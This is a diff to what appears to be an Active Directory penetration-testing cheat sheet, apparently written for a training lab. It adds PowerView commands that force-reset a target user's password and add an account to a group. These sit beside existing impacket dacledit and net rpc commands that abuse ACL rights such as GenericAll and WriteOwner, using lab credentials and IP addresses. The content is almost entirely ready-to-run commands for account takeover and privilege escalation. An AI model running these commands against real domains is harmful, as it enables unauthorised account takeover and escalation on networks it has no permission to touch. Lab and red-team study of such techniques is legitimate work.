@@ -1284,6 +1284,9 @@ Reset Password
 GenericAll, AllExtendedRights, User-Force-Change-Password
 ```powershell
 Set-ADAccountPassword target_user -NewPassword $((ConvertTo-SecureString 'Password123!' -AsPlainText -Force)) -Reset -Verbose
+
+# PowerView
+Set-DomainUserPassword -Identity target_user -AccountPassword $((ConvertTo-SecureString 'Password123!' -AsPlainText -Force)) -Verbose
 ```
 ```linux
 # net rpc
@@ -1312,6 +1315,9 @@ Own Target
 python3 examples/dacledit.py -principal own_user -target "Managers" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action 'write'
 
 net rpc group addmem "Managers" "own_user" -U inlanefreight.local/own_user%Password1 -S 10.129.205.81
+
+# PowerView
+Add-DomainGroupMember -Identity MicrosoftSync -Members remote_svc$ -Verbose
 ```
 
 WriteOwner
